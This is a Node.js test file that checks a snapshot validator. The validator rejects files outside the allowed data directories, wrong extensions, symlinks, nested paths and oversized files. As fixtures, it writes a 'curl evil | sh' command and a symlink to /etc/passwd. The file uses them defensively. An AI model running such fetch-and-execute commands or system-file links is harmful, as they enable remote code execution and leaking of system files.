// node --test scripts/watch/accept-snapshot.test.mjs — audit 2026-10-25 round 3, L23.
import {test} from "node:test";
import assert from "node:assert/strict";
import {mkdirSync, mkdtempSync, symlinkSync, writeFileSync} from "node:fs";
import {tmpdir} from "node:os";
import {join} from "node:path";
import {MAX_FILE_BYTES, rejectedPaths} from "./accept-snapshot.mjs";

const snapshot = () => {
  const root = mkdtempSync(join(tmpdir(), "watch-"));
  for (const d of ["state", "canary", "diff", "digest", "routes"]) mkdirSync(join(root, d));
  writeFileSync(join(root, "addresses.json"), "{}");
  writeFileSync(join(root, "routes.json"), "[]");
  writeFileSync(join(root, "state", "protocol-lending-aave-evm.json"), "{}");
  writeFileSync(join(root, "canary", "2026-10-26.json"), "{}");
  writeFileSync(join(root, "digest", "2026-10-26.md"), "# digest");
  return root;
};

test("a normal snapshot is accepted", () => {
  assert.deepEqual(rejectedPaths(snapshot()), []);
});

test("files outside the data dirs, other extensions, links and oversized files are rejected", () => {
  const root = snapshot();
  mkdirSync(join(root, "..github"));
  writeFileSync(join(root, "..github", "x.json"), "{}");
  writeFileSync(join(root, "state", "run.sh"), "curl evil | sh");
  writeFileSync(join(root, "extra.json"), "{}");
  symlinkSync("/etc/passwd", join(root, "state", "leak.json"));
  writeFileSync(join(root, "diff", "big.json"), Buffer.alloc(MAX_FILE_BYTES + 1));
  mkdirSync(join(root, "state", "nested"));
  writeFileSync(join(root, "state", "nested", "deep.json"), "{}");
  const bad = rejectedPaths(root);
  for (const p of ["..github/x.json", "state/run.sh", "extra.json", "state/leak.json (link)", "state/nested/deep.json"]) assert.ok(bad.includes(p), `${p} in ${bad}`);
  assert.ok(bad.some((p) => p.startsWith("diff/big.json (")));
});
